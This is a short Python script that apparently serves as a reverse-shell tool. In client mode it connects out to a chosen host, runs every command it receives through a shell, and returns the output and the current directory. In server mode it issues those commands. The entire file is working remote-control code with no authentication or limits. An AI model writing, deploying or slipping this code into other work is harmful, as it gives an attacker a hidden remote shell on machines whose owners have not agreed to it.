import socket
import getopt
import sys
import subprocess
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def server(host,port):
    print("Starting Server")
    s.bind((host,port))
    s.listen(5)
    print("listening on" + host + ":" + str(port))
    con, _ = s.accept()
    print("Client connected")
    while True:
        cmd = input("$> ")
        con.sendall(cmd.encode())
        msg = con.recv(1024)
        print(msg.decode())

def client(host,port):
    s.connect((host,port))
    print("Connected To Server")
    while True:
        cmd = s.recv(1024).decode()
        result = subprocess.Popen(cmd,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE,shell=True)
        outs = result.stdout.read() + result.stderr.read()
        outs_str = outs.decode()
        s.sendall(str.encode(outs_str+ os.getcwd()))

def StartConnection(host,port,tipe):
    if tipe == "server":
        server(host,port)
    elif tipe == "client":
        client(host,port)

host = ""
port = 0
tipe = "client"

options , _ = getopt.getopt(sys.argv[1:],"h:p:s",["host=","port=","server"])
for key, value in options:
    if key == "-h" or key == "--host":
        host = value
    if key == "-p" or key == "--port":
        port = int(value)
    if key == "-s" or key == "--server":
        tipe = "server"
StartConnection(host,port,tipe)